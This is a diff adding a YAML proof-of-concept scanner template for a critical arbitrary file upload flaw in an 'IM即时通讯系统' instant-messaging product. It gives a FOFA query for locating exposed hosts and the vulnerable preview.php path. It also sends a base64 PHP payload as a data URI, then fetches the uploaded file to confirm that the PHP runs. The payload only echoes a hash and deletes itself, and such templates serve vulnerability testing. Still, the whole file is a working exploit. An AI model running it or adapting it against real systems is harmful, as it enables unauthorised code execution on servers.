@@ -1,0 +1,25 @@
+id: poc-yaml-ims-preview-php-anyfile-upload
+info:
+  name: IM即时通讯系统 preview.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: IM即时通讯系统
+  fofa: body="/superloginAction.html" || "im.smiaoshen.com"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  t3: base64(concat(`<?php echo md5(`,str(t1),`);unlink(__FILE__);`))
+requests:
+- method: POST
+  path: /static/lib/webuploader/0.1.5/server/preview.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: data:image/php;base64,{{.t3}}
+  expression: status_code == 200 && contains(body,".php") && contains(body,"id")
+  output:
+  - regex_match(body,"(?P<file>[a-z0-9]{32}).php")
+- method: GET
+  path: /static/lib/webuploader/0.1.5/server/preview/{{.file}}.php
+  expression: status_code == 200 && body == t2
+transport: http
